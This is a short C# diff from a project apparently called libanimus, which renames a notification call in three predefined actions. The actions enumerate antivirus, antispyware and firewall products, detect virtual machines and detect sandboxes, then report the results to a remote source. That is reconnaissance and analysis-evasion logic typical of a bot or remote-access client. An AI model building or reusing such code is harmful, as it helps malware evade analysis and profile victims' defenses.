@@ -39,7 +39,7 @@ namespace libanimus.Actions.Predefined
 			var fw = Detector.ListFirewalls ();
 			var all_av_products = avs.Concat (asw).Concat (fw);
 
-			NetworkManager.Instance.NotifySource (src, all_av_products.Any ()
+			NetworkManager.Instance.Notify (src, all_av_products.Any ()
 				? string.Format (MSG_AV, string.Join (", ", all_av_products))
 				: MSG_NOAV);
 		}
@@ -51,7 +51,7 @@ namespace libanimus.Actions.Predefined
 			var vm = Detector.IsVM ();
 			var vmname = Detector.GetVMName ();
 
-			NetworkManager.Instance.NotifySource (src, vm ? string.Format (MSG_VM, vmname) : MSG_NOVM);
+			NetworkManager.Instance.Notify (src, vm ? string.Format (MSG_VM, vmname) : MSG_NOVM);
 		}
 
 		void DetectSandbox () {
@@ -61,7 +61,7 @@ namespace libanimus.Actions.Predefined
 			var sandbox = Detector.IsSandbox ();
 			var sandboxes = Detector.GetSandboxNames ();
 
-			NetworkManager.Instance.NotifySource (src, sandbox ?
+			NetworkManager.Instance.Notify (src, sandbox ?
 				string.Format (MSG_SANDBOX, string.Join (", ", sandboxes))
 				: MSG_NOSANDBOX);
 		}
